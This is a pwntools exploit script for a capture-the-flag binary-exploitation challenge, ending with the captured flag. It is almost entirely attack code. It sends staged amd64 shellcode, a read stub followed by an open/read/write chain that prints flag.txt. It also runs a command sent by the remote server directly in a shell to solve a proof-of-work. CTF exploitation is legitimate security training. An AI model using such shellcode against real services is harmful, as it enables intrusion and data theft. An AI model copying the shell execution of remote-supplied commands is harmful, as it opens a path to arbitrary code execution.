#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 6789
HOST = "chall.cscv.vn"
exe = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            brva 0x00000000000014E8
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD
p.recvuntil(b'work: ')
curl_command = p.recvuntil(b'\n', drop=True)
captcha_solution = subprocess.check_output(curl_command, shell=True)
p.sendafter(b"solution: ", captcha_solution)

shellcode = asm('''
	push rdx
	pop rsi
	push rax
	pop rdi
	syscall
	''', arch='amd64')
p.send(shellcode)

payload = b'a'*6
payload += asm('''
	push 0
	pop rax
	push 0x50
	pop rdx
	syscall
	''')
p.send(payload)

payload = b'flag.txt'
payload = payload.ljust(0xe, b'\0')
payload += asm('''
	push 2
	pop rax
	mov rdi, rsi
	xor rsi, rsi
	xor rdx, rdx
	syscall

	mov rdi, rax
	push rdx
	pop rax
	add rcx, 0xe4
	mov rsi, rcx
	push 0x50
	pop rdx
	syscall

	push 1
	pop rax
	push 1
	pop rdi
	syscall
	''', arch='amd64')
input("Press ENTER")
p.send(payload)

p.interactive()

# CSCV2025{ju57_b3c4u53_y0u_d0n7_g1v3_up_d035n7_m34n_y0u_w1ll_m4k3_17}